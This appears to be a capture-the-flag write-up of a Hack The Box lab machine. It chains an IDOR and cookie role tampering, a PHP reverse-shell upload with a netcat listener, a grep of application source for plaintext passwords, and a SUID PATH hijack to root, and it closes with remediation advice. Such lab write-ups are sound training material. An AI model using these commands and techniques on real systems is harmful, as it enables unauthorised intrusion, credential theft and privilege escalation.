# Write-Up — Base: IDOR-Enabled Upload Bypass to Root via PATH Hijack

> **Type:** Web Application / Linux Privilege Escalation Penetration Test (HTB Starting Point)
> **Target:** `10.129.95.191`
> **Tools:** Nmap, Gobuster, Browser Dev Tools, php-reverse-shell.php, netcat, su, find
> **Final Result:** Root access via a chained path: IDOR-based privilege escalation on the web app → arbitrary PHP upload → password reuse → SUID binary `$PATH` hijack

---

## 1. Introduction

The target is a Linux host running an Apache/PHP web application with a login/admin panel under a `cdn-cgi/login` path. The objective was to enumerate the application, escalate access through an authorization flaw, gain code execution, move laterally to a second user via password reuse, and escalate to root through a misconfigured SUID binary.

This box is a strong demonstration of a multi-stage chain, where no single step is a sophisticated exploit:

- **Insecure Direct Object Reference (IDOR)** — user records enumerable simply by changing an `id` parameter in the URL.
- **Client-side trust of role/session data** — cookie values controlling access level, editable directly via browser dev tools.
- **Arbitrary file upload** once elevated access is obtained, leading directly to remote code execution.
- **Credential reuse** across accounts once a plaintext password was found in application source.
- **SUID binary `$PATH` hijacking** — a classic Linux privilege escalation technique exploiting a binary that calls another program without a fully qualified path.

---

## 2. Reconnaissance

### 2.1 Connectivity Check

```bash
ping 10.129.95.191
```

Successful replies confirmed the VPN tunnel was up and the target was reachable.

### 2.2 Port Scan — Nmap

```bash
nmap -sV -sC 10.129.95.191
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 (Ubuntu 4ubuntu0.3) |
| 80/tcp | HTTP | Apache 2.4.29 (Ubuntu) |

Two ports were found open. With no SSH credentials available, the web application on port 80 (title: **"Welcome"**) was the starting point for enumeration.

---

## 3. Vulnerability Analysis

### 3.1 Identifying the IDOR

Browsing the application's admin section, an account details page was reached at:

```
http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2
```

Changing the `id` parameter directly in the URL:

```
http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1
```

returned a **different user's account details** — confirming an **Insecure Direct Object Reference (IDOR)**. No authorization check validated whether the currently logged-in user was permitted to view the requested `id`, allowing enumeration of every account, including the administrator's.

### 3.2 The Vulnerability

- **CVE:** N/A — this is an application authorization-logic flaw
- **Type:** IDOR (broken object-level access control), compounded by client-side trust of privilege data
- **Authentication:** A valid low-privilege session was sufficient; no admin credentials were ever needed
- **Impact:** Disclosure of the administrator's user ID, followed by direct elevation of the current session's privileges

### 3.3 Escalating via Cookie Manipulation

With the admin account's ID known, the current session's cookies were edited directly via browser Developer Tools, setting:

```
user = 34322
role = admin
```

Revisiting the application's **Uploads** page — previously inaccessible — now succeeded, confirming that **role enforcement relied entirely on client-supplied cookie values**, with no server-side re-validation against the actual authenticated identity.

---

## 4. Initial Access — Arbitrary File Upload to RCE

### 4.1 Preparing a PHP Reverse Shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Edited the `$ip` and `$port` variables to point to the attacking host and a chosen listening port.

### 4.2 Uploading the Shell

Using the now-accessible upload form, the modified `php-reverse-shell.php` was submitted successfully.

### 4.3 Locating the Uploaded File

```bash
gobuster dir --url http://10.129.95.191/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

This confirmed an `/uploads` directory (the directory itself was not browsable, but the guessed/confirmed path was correct).

### 4.4 Triggering the Shell

Listener started:

```bash
nc -lvnp 1234
```

Shell triggered via browser:

```
http://10.129.95.191/uploads/php-reverse-shell.php
```

The listener caught the callback, providing a shell as `www-data`. Upgraded to a full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

> **Severity: Critical.** Broken access control on both object-level data and role assignment allowed a low-privilege session to fully impersonate an administrator, directly enabling arbitrary file upload and remote code execution.

---

## 5. Lateral Movement

### 5.1 Searching for Credentials in Application Source

As `www-data`, the web directory was searched for leaked secrets:

```bash
cd /var/www/html/cdn-cgi/login
cat * | grep -i passw*
```

This surfaced a password: `MEGACORP_4dm1n!!`.

### 5.2 Identifying Candidate Users

```bash
cat /etc/passwd
```

A local user `robert` was identified. The recovered password was tested against this account:

```bash
su robert
```

This attempt **failed** — the password was not valid for `robert`.

### 5.3 Locating the Correct Credential

Reviewing application files individually, `db.php` was found to contain a working credential, which succeeded:

```bash
su robert
```

### 5.4 User Flag

```bash
cat ~/user.txt
```

This returned the flag from `robert`'s home directory, submitted to the Starting Point page.

---

## 6. Privilege Escalation

### 6.1 Basic Enumeration

```bash
id
sudo -l
```

`robert` was found to be a member of the **`bugtracker`** group.

### 6.2 Locating Group-Owned Binaries

```bash
find / -group bugtracker 2>/dev/null
```

This returned `/usr/bin/bugtracker`.

### 6.3 Inspecting the Binary

```bash
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

The binary was found to have the **SUID bit set**, owned by root — meaning it always executes with root privileges regardless of the invoking user.

### 6.4 Identifying the PATH Hijack Opportunity

Running the binary showed it attempting to invoke `cat` on a file, erroring in a way that indicated `cat` was called **without a fully qualified path** — relying on the shell's `$PATH` to locate the executable.

### 6.5 Exploiting the PATH Hijack

```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
```

```bash
/usr/bin/bugtracker
```

Because `/tmp` was prepended to `$PATH`, the malicious `cat` script was resolved and executed instead of the legitimate `/bin/cat` — inheriting the SUID binary's root privileges and spawning a root shell.

### 6.6 Root Flag

```bash
cat /root/root.txt
```

This returned the final flag, completing the machine.

> **Severity: Critical.** A SUID root binary calling another executable by name rather than by absolute path allowed full privilege escalation via a trivial `$PATH` manipulation.

---

## 7. Full Attack Chain

```
[ Recon: Nmap ]
       │
       ▼
[ SSH (22) + Apache/PHP (80) ]
       │
       ▼
[ admin.php?content=accounts&id=N → IDOR confirms enumerable accounts ]
       │
       ▼
[ Cookie edited: user=<admin_id>, role=admin ]
       │
       ▼
[ Uploads page accessible → php-reverse-shell.php uploaded ]
       │
       ▼
[ Gobuster confirms /uploads → shell triggered → www-data foothold ]
       │
       ▼
[ grep -i passw* in app source → MEGACORP_4dm1n!! found ]
       │
       ▼
[ Password reuse tested/found → su robert → user.txt read ]
       │
       ▼
[ robert in 'bugtracker' group → SUID /usr/bin/bugtracker found ]
       │
       ▼
[ PATH hijack: malicious /tmp/cat + export PATH=/tmp:$PATH ]
       │
       ▼
[ bugtracker executed → root shell → root.txt read ]
```

**Lesson:** Two entirely different classes of misconfiguration — broken web authorization and an unsafe SUID binary — were chained together with a simple credential-reuse step in between. Neither required custom exploit code.

---

## 8. Remediation Summary

| # | Finding | Severity | Remediation |
|---|---------|----------|--------------|
| 1 | IDOR on `admin.php?content=accounts&id=N` | **Critical** | Enforce server-side authorization checks on every object access, verifying the requesting user is permitted to view the specific `id` requested — never rely on the parameter value alone. |
| 2 | Role/privilege stored in a client-editable cookie with no server-side re-validation | **Critical** | Store session role/privilege state server-side (session store or signed/encrypted tokens); never trust client-supplied values for authorization decisions. |
| 3 | Unrestricted file upload allowing arbitrary PHP execution | **Critical** | Validate uploaded file types via content inspection (not just extension); store uploads outside the web root or disable script execution in the upload directory. |
| 4 | Plaintext credentials stored in application source files | **High** | Store credentials in environment variables or a secrets manager; never hardcode them in source accessible via the web root. |
| 5 | Password reuse across application and OS-level accounts | **Medium** | Enforce unique credentials per system/account; deploy credential-reuse detection or a password manager policy for administrators. |
| 6 | SUID root binary invoking a subprocess (`cat`) without an absolute path | **Critical** | Always call subprocesses using fully qualified paths (e.g., `/bin/cat`) in SUID/privileged binaries, and explicitly set a safe, minimal `$PATH` within the program itself rather than trusting the caller's environment. |

---

## 9. Conclusion

This box is a compact illustration of principles that scale directly to real-world assessments:

1. **Authorization bugs are often simpler than authentication bugs — and just as damaging.** No password was cracked to gain admin-equivalent access; a URL parameter and a cookie value were enough.
2. **Credential reuse turns one leaked secret into multiple compromised accounts.** The same password very nearly worked for a second user, and eventually did for the actual target account.
3. **SUID binaries are only as safe as their internal path-handling.** A single unqualified subprocess call turned a legitimate administrative tool into a root shell vending machine.

The fix, as with most findings of this class, is defense at every layer: validate authorization server-side, never trust client state, and code privileged binaries defensively — regardless of what environment they're executed in.
